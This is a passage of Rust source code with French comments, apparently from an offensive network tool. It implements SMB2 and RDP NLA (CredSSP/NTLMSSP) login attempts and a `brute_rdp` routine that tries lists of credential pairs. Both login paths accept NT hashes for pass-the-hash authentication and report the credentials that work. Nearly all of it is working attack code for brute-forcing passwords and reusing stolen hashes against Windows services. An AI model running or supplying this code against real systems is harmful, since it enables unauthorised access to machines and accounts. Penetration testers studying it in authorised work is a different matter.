        extract_ntlmssp, parse_type2, spnego_auth, spnego_init, NtlmAuth, NtlmSecret,
    };

    let addr = format!("{}:{}", host, port);
    let Ok(Ok(mut stream)) = tokio::time::timeout(timeout, TcpStream::connect(&addr)).await else {
        return AttemptOutcome::Error;
    };

    // ── 1) NEGOTIATE (dialecte 3.1.1 annoncé avec ses contextes) ────────────
    let mut preauth = PreauthIntegrityHash::new();
    let mut neg = smb2_header(SMB2_NEGOTIATE, 0, 0);
    neg.extend_from_slice(&smb2_negotiate_request(&random_preauth_salt()));
    if smb2_write(&mut stream, &neg, timeout).await.is_err() {
        return AttemptOutcome::Error;
    }
    preauth.update(&neg);

    let Ok(resp) = smb2_read_message(&mut stream, timeout).await else {
        return AttemptOutcome::Error;
    };
    if smb2_status(&resp) != SMB2_STATUS_SUCCESS {
        return AttemptOutcome::Error;
    }
    preauth.update(&resp);

    let Some(nego) = smb2_parse_negotiate(&resp) else {
        return AttemptOutcome::Failure;
    };
    let dialect = nego.dialect;
    if dialect < 0x0202 {
        return AttemptOutcome::Failure;
    } // SMB1 non géré

    // ── 2) SESSION_SETUP #1 — NTLMSSP Type 1 (SPNEGO NegTokenInit) ──────────
    let (user_dom, account) = split_domain_account(user);
    let secret = match parse_nt_hash(pass) {
        Some(h) => NtlmSecret::NtHash(h),
        None => NtlmSecret::Password(pass.to_string()),
    };
    let pth = secret.is_pass_the_hash();

    let type1 = NtlmAuth::new(&account, &user_dom, secret.clone()).type1();
    let mut req1 = smb2_header(SMB2_SESSION_SETUP, 1, 0);
    req1.extend_from_slice(&smb2_session_setup_body(&spnego_init(&type1)));
    if smb2_write(&mut stream, &req1, timeout).await.is_err() {
        return AttemptOutcome::Error;
    }
    preauth.update(&req1);
    let Ok(resp1) = smb2_read_message(&mut stream, timeout).await else {
        return AttemptOutcome::Error;
    };
    preauth.update(&resp1);
    let status1 = smb2_status(&resp1);
    if status1 != SMB2_STATUS_MORE_PROCESSING_REQUIRED {
        return smb2_status_outcome(status1);
    }

    // ── 3) Extraction du CHALLENGE (Type 2) ─────────────────────────────────
    let blob1 = smb2_session_setup_blob(&resp1);
    let Some(challenge) = extract_ntlmssp(&blob1) else {
        return AttemptOutcome::Error;
    };
    let Some(t2) = parse_type2(&challenge) else {
        return AttemptOutcome::Error;
    };
    let session_id = smb2_session_id(&resp1);

    // Domaine : priorité à la saisie opérateur, sinon `MsvAvNbDomainName`.
    let domain = if !user_dom.is_empty() {
        user_dom
    } else {
        avpair_domain(&t2.target_info).unwrap_or_default()
    };

    // ── 4) SESSION_SETUP #2 — NTLMSSP Type 3 (SPNEGO NegTokenResp) ──────────
    let auth = NtlmAuth::new(&account, &domain, secret);
    let (type3, ntlm_session_key) = auth.type3_with_key(&t2);
    let mut req3 = smb2_header(SMB2_SESSION_SETUP, 2, session_id);
    req3.extend_from_slice(&smb2_session_setup_body(&spnego_auth(&type3)));
    if smb2_write(&mut stream, &req3, timeout).await.is_err() {
        return AttemptOutcome::Error;
    }
    preauth.update(&req3);
    let Ok(resp3) = smb2_read_message(&mut stream, timeout).await else {
        return AttemptOutcome::Error;
    };
    preauth.update(&resp3);

    match smb2_status(&resp3) {
        SMB2_STATUS_SUCCESS => {
            // 3.1.1 : le chiffrement négocié, l'integrity hash (chaîné sur les
            // six messages du handshake), la clé de signature dérivée par KDF et
            // la **signature effective** d'un `TREE_CONNECT` complètent la preuve.
            let mut detail = String::new();
            if dialect == SMB2_DIALECT_311 {
                let h = preauth.finalize();
                let mut sign = String::new();
                if let Some(sk) = ntlm_session_key {
                    let signing_key = smb2_signing_key(&sk, &h);
                    sign = format!(", clé de signature {}", hex::encode(signing_key));
                    // La signature n'est éprouvée que si le serveur l'annonce :
                    // sinon un message marqué `SIGNED` serait refusé.
                    if nego.security_mode & SMB2_NEGOTIATE_SIGNING_ENABLED != 0 {
                        let probe = smb2_signed_tree_connect(
                            &mut stream,
                            host,
                            session_id,
                            &signing_key,
                            timeout,
                        )
                        .await;
                        sign.push_str(&format!(", {}", probe));
                    }
                }
                detail = format!(
                    " [chiffrement {}, integrity hash {}{}]",
                    nego.cipher.map(smb2_cipher_label).unwrap_or("aucun"),
                    hex::encode(&h[..8]),
                    sign,
                );
            }
            AttemptOutcome::Success(format!(
                "SMB2{}{} session NTLM{} authentifiée : {}\\{}:{}",
                dialect_label(dialect),
                detail,
                if pth { " (pass-the-hash)" } else { "v2" },
                domain,
                account,
                pass,
            ))
        }
        other => smb2_status_outcome(other),
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// 17. RDP — NLA / CredSSP (TPKT + X.224 + TLS + SPNEGO/NTLMSSP)
//
// Flux : négociation X.224 (`RDP_NEG_REQ` annonçant PROTOCOL_HYBRID), bascule
// **TLS sur la même socket** (certificat auto-signé accepté), puis handshake
// CredSSP : trois `TSRequest` DER transportant les jetons SPNEGO/NTLMSSP
// (Type 1 → Type 2 → Type 3). Le serveur accepte en émettant un dernier
// `TSRequest` (`pubKeyAuth`) ; un refus se traduit par une coupure du canal TLS.
// Le support `NtlmSecret::NtHash` offre le **pass-the-hash**, comme pour SMB/WinRM.
// ─────────────────────────────────────────────────────────────────────────────

/// `TPDU` de type « Connection Request » (X.224, [MS-RDPBCGR] §2.2.1.1).
const RDP_TPDU_CONNECTION_REQUEST: u8 = 0xE0;
/// `RDP_NEG_REQ` — structure de négociation émise par le client.
const RDP_TYPE_NEG_REQ: u8 = 1;
/// `RDP_NEG_RSP` — réponse positive du serveur.
const RDP_TYPE_NEG_RSP: u8 = 2;
/// `RDP_NEG_FAILURE` — réponse négative du serveur.
const RDP_TYPE_NEG_FAILURE: u8 = 3;
/// Protocoles négociables : SSL simple et NLA (`HYBRID` = CredSSP).
const RDP_PROTOCOL_SSL: u32 = 1;
const RDP_PROTOCOL_HYBRID: u32 = 2;

/// Construit la trame TPKT/X.224 « Connection Request » portant un
/// `RDP_NEG_REQ` qui demande `PROTOCOL_HYBRID | PROTOCOL_SSL` (trame de
/// 19 octets attendue par tout serveur RDP).
fn rdp_connection_request() -> Vec<u8> {
    // X.224 CR TPDU (partie variable) : DST-REF, SRC-REF, CLASS-OPTION puis la
    // structure RDP_NEG_REQ (Type, Flags, Length=8, requestedProtocols).
    let mut neg = Vec::with_capacity(13);
    neg.extend_from_slice(&0u16.to_le_bytes()); // DST-REF
    neg.extend_from_slice(&0u16.to_le_bytes()); // SRC-REF
    neg.push(0); // CLASS-OPTION
    neg.push(RDP_TYPE_NEG_REQ); // Type
    neg.push(0); // Flags
    neg.extend_from_slice(&8u16.to_le_bytes()); // Length
    neg.extend_from_slice(&(RDP_PROTOCOL_HYBRID | RDP_PROTOCOL_SSL).to_le_bytes());

    // TPDU : LengthIndicator (= longueur de la partie variable + 1), Code, variable.
    let mut tpdu = Vec::with_capacity(neg.len() + 2);
    tpdu.push((neg.len() + 1) as u8);
    tpdu.push(RDP_TPDU_CONNECTION_REQUEST);
    tpdu.extend_from_slice(&neg);

    // TPKT : Version(3), Reserved(0), Length (big-endian, en-tête TPKT inclus).
    let mut tpkt = Vec::with_capacity(tpdu.len() + 4);
    tpkt.push(3);
    tpkt.push(0);
    tpkt.extend_from_slice(&((tpdu.len() + 4) as u16).to_be_bytes());
    tpkt.extend_from_slice(&tpdu);
    tpkt
}

/// Extrait `selectedProtocols` d'une réponse de négociation X.224.
/// Renvoie `None` si la trame n'est pas une `RDP_NEG_RSP` positive.
fn rdp_selected_protocol(pkt: &[u8]) -> Option<u32> {
    // TPKT(4) + LI(1) + Code(1) + DST-REF(2) + SRC-REF(2) + CLASS(1)
    // + Type(1) + Flags(1) + Length(2) + valeur(4) = 19 octets.
    if pkt.len() < 19 || pkt[0] != 3 {
        return None;
    }
    if pkt[11] != RDP_TYPE_NEG_RSP {
        return None;
    } // NEG_FAILURE ou trame inattendue
    Some(u32::from_le_bytes([pkt[15], pkt[16], pkt[17], pkt[18]]))
}

// ── Encodage DER minimal (TSRequest CredSSP, [MS-CSSP] §2.2.1) ───────────────

fn der_len(n: usize) -> Vec<u8> {
    if n < 0x80 {
        return vec![n as u8];
    }
    let mut body = Vec::new();
    let mut v = n;
    while v > 0 {
        body.insert(0, (v & 0xFF) as u8);
        v >>= 8;
    }
    let mut out = vec![0x80 | body.len() as u8];
    out.extend_from_slice(&body);
    out
}

fn der_tlv(tag: u8, content: &[u8]) -> Vec<u8> {
    let mut out = vec![tag];
    out.extend_from_slice(&der_len(content.len()));
    out.extend_from_slice(content);
    out
}

/// `TSRequest ::= SEQUENCE { version [0] INTEGER, negoTokens [1] NegoData }`
/// avec `NegoData ::= SEQUENCE OF SEQUENCE { negoToken [0] OCTET STRING }`.
fn ts_request_nego(version: u8, token: &[u8]) -> Vec<u8> {
    let version_c = der_tlv(0xA0, &der_tlv(0x02, &[version]));
    let nego_elem = der_tlv(0xA0, &der_tlv(0x04, token)); // [0] OCTET STRING
    let nego_seq = der_tlv(0x30, &nego_elem); // SEQUENCE { NegoData }
    let nego_data = der_tlv(0x30, &nego_seq); // SEQUENCE OF NegoData
    let nego = der_tlv(0xA1, &nego_data); // [1] NegoData

    let mut body = Vec::new();
    body.extend_from_slice(&version_c);
    body.extend_from_slice(&nego);
    der_tlv(0x30, &body)
}

/// Lit un `TSRequest` complet depuis le canal TLS (les jetons NTLMSSP tiennent
/// largement dans un seul enregistrement TLS).
async fn rdp_read_tsrequest<S>(stream: &mut S, timeout: Duration) -> Result<Vec<u8>, ()>
where
    S: tokio::io::AsyncRead + Unpin,
{
    let mut buf = vec![0u8; 16 * 1024];
    match tokio::time::timeout(timeout, stream.read(&mut buf)).await {
        Ok(Ok(n)) if n > 0 => {
            buf.truncate(n);
            Ok(buf)
        }
        _ => Err(()),
    }
}

/// Une tentative d'authentification RDP avec NLA (CredSSP + NTLMSSP).
async fn try_rdp_login(
    host: &str,
    port: u16,
    user: &str,
    pass: &str,
    timeout: Duration,
) -> AttemptOutcome {
    use crate::ntlm::{
        extract_ntlmssp, parse_type2, spnego_auth, spnego_init, NtlmAuth, NtlmSecret,
    };

    let addr = format!("{}:{}", host, port);
    let Ok(Ok(mut sock)) = tokio::time::timeout(timeout, TcpStream::connect(&addr)).await else {
        return AttemptOutcome::Error;
    };

    // ── 1) Négociation X.224 : exiger PROTOCOL_HYBRID (NLA) ─────────────────
    if write_all_to(&mut sock, &rdp_connection_request(), timeout)
        .await
        .is_err()
    {
        return AttemptOutcome::Error;
    }
    let Ok(hdr) = read_n(&mut sock, 4, timeout).await else {
        return AttemptOutcome::Error;
    };
    let total = u16::from_be_bytes([hdr[2], hdr[3]]) as usize;
    if !(4..=4096).contains(&total) {
        return AttemptOutcome::Error;
    }
    let Ok(rest) = read_n(&mut sock, total - 4, timeout).await else {
        return AttemptOutcome::Error;
    };
    let mut neg = hdr;
    neg.extend_from_slice(&rest);

    match rdp_selected_protocol(&neg) {
        Some(p) if p & RDP_PROTOCOL_HYBRID != 0 => {}
        // Serveur sans NLA (RDP « simple ») ou négociation refusée.
        Some(_) => return AttemptOutcome::Failure,
        None => return AttemptOutcome::Error,
    }

    // ── 2) Bascule TLS sur la même socket (certificat auto-signé accepté) ───
    let Some(mut tls) = insecure_tls_connect(sock, host, timeout).await else {
        return AttemptOutcome::Error;
    };

    // ── 3) CredSSP : trois TSRequest DER portant les jetons SPNEGO/NTLMSSP ──
    let (user_dom, account) = split_domain_account(user);
    let secret = match parse_nt_hash(pass) {
        Some(h) => NtlmSecret::NtHash(h),
        None => NtlmSecret::Password(pass.to_string()),
    };
    let pth = secret.is_pass_the_hash();

    // 3a) Type 1 (NegTokenInit) → le serveur répond un Type 2 (CHALLENGE).
    let type1 = NtlmAuth::new(&account, &user_dom, secret.clone()).type1();
    if write_all_s(&mut tls, &ts_request_nego(2, &spnego_init(&type1)), timeout)
        .await
        .is_err()
    {
        return AttemptOutcome::Error;
    }
    let Ok(resp1) = rdp_read_tsrequest(&mut tls, timeout).await else {
        return AttemptOutcome::Error;
    };
    let Some(challenge) = extract_ntlmssp(&resp1) else {
        return AttemptOutcome::Failure;
    };
    let Some(t2) = parse_type2(&challenge) else {
        return AttemptOutcome::Failure;
    };

    let domain = if !user_dom.is_empty() {
        user_dom
    } else {
        avpair_domain(&t2.target_info).unwrap_or_default()
    };

    // 3b) Type 3 (NegTokenResp).
    let type3 = NtlmAuth::new(&account, &domain, secret).type3(&t2);
    if write_all_s(&mut tls, &ts_request_nego(2, &spnego_auth(&type3)), timeout)
        .await
        .is_err()
    {
        return AttemptOutcome::Error;
    }

    // 3c) Succès = le serveur émet un dernier TSRequest (`pubKeyAuth`) ; un
    //     credential refusé fait couper le canal TLS (EOF ou alerte).
    let mut buf = [0u8; 4096];
    match tokio::time::timeout(timeout, tls.read(&mut buf)).await {
        Ok(Ok(n)) if n > 0 => AttemptOutcome::Success(format!(
            "RDP NLA {}:{} — CredSSP/NTLM{} authentifié : {}\\{}:{}",
            host,
            port,
            if pth { " (pass-the-hash)" } else { "v2" },
            domain,
            account,
            pass,
        )),
        Ok(Ok(_)) => AttemptOutcome::Failure, // EOF : identifiants refusés
        Ok(Err(_)) => AttemptOutcome::Failure, // alerte TLS = refus
        Err(_) => AttemptOutcome::Error,
    }
}

pub async fn brute_rdp(host: &str, port: u16, cfg: &BruteConfig) -> BruteReport {
    let start = std::time::Instant::now();
    let target = format!("{}:{}", host, port);

    let (total_tried, found) = run_credential_attempts(
        cfg.credential_pairs(),
        cfg,
        "rdp",
        &target,
        |user, pass| async move { try_rdp_login(host, port, &user, &pass, cfg.timeout).await },
    )
    .await;

    let successes = found
        .into_iter()
        .map(|(u, p, proof)| {
            brute_result("rdp", host, port, u, p, proof, start.elapsed().as_millis())
        })
        .collect();

    BruteReport {
        target,
        service: "rdp".into(),
        total_tried,
        successes,
        duration_ms: start.elapsed().as_millis(),
    }
}
